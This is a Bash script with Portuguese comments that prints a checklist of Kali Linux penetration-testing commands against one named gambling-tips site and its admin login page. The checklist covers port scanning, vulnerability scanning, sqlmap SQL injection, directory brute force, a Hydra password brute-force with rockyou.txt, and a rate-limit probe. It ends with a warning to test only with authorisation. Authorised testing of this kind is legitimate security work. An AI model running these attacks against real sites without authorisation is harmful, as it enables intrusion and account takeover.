#!/bin/bash
# Script com comandos úteis do Kali Linux para teste de segurança

echo "=========================================="
echo "  COMANDOS KALI LINUX - TESTE DE SEGURANÇA"
echo "=========================================="
echo ""

SITE="https://www.reidoslotsinais.com"
LOGIN_URL="${SITE}/admin/login"

echo "1. TESTE COM NMAP (Scan de portas e serviços)"
echo "----------------------------------------------"
echo "nmap -sV -sC -p- www.reidoslotsinais.com"
echo ""

echo "2. TESTE COM NIKTO (Scanner de vulnerabilidades web)"
echo "------------------------------------------------------"
echo "nikto -h www.reidoslotsinais.com"
echo ""

echo "3. TESTE COM SQLMAP (Teste de SQL Injection)"
echo "---------------------------------------------"
echo "# Primeiro, capture a requisição com Burp Suite ou salve em um arquivo"
echo "# Depois execute:"
echo "sqlmap -u '${LOGIN_URL}' --forms --batch --crawl=2"
echo ""

echo "4. TESTE COM DIRB/DIRBUSTER (Força bruta de diretórios)"
echo "--------------------------------------------------------"
echo "dirb ${SITE} /usr/share/wordlists/dirb/common.txt"
echo ""

echo "5. TESTE COM BURP SUITE (Recomendado - Interface gráfica)"
echo "-----------------------------------------------------------"
echo "# 1. Abra o Burp Suite"
echo "# 2. Configure o proxy no navegador (127.0.0.1:8080)"
echo "# 3. Navegue até ${LOGIN_URL}"
echo "# 4. Use o Burp Scanner para análise automática"
echo "# 5. Use o Intruder para testes de força bruta"
echo ""

echo "6. TESTE COM OWASP ZAP (Alternativa ao Burp)"
echo "-----------------------------------------------"
echo "# Via linha de comando:"
echo "zap-cli quick-scan --self-contained ${SITE}"
echo ""
echo "# Ou use a interface gráfica: zaproxy"
echo ""

echo "7. TESTE DE SSL/TLS"
echo "-------------------"
echo "sslscan ${SITE}"
echo "testssl.sh ${SITE}"
echo ""

echo "8. TESTE COM HYDRA (Força bruta de login)"
echo "------------------------------------------"
echo "# Exemplo (use com cuidado e apenas em ambiente autorizado):"
echo "# hydra -l admin -P /usr/share/wordlists/rockyou.txt ${SITE} http-post-form '/admin/login:username=^USER^&password=^PASS^:F=invalid'"
echo ""

echo "9. VERIFICAR HEADERS HTTP"
echo "--------------------------"
echo "curl -I ${SITE}"
echo "curl -I ${LOGIN_URL}"
echo ""

echo "10. TESTE DE RATE LIMITING"
echo "---------------------------"
echo "for i in {1..20}; do curl -X POST ${LOGIN_URL} -d 'username=test&password=test' -w '%{http_code}\n' -o /dev/null -s; sleep 0.5; done"
echo ""

echo "=========================================="
echo "IMPORTANTE:"
echo "- Use essas ferramentas apenas em sites que você possui ou tem autorização"
echo "- Alguns testes podem ser detectados como ataques"
echo "- Sempre use com responsabilidade"
echo "=========================================="
